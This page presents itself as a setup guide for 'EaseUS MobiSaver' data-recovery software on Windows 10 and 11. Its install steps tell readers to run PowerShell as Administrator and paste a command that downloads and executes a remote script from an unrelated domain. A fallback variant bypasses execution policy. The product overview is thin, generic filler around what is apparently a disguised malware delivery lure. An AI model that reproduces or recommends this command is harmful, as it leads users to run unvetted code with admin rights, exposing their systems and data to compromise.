Windows 10 & 11 · data recovery · data & recovery.

**EaseUS MobiSaver** on **Windows 10 and 11** — data recovery and day-to-day notes for it teams and users protecting local data.

## Get started

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) if prompted
4. When the process finishes, open **EaseUS MobiSaver** from Start or the desktop shortcut

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

EaseUS MobiSaver targets data recovery scenarios tied to phones and portable backups when those workflows are mirrored or supported on a Windows workstation. It fits beside classic file recovery when media was synced or exported to the PC.

Open the desktop client, connect the device or browse backup images, then step through scan and preview before saving contacts, messages, or media to disk.
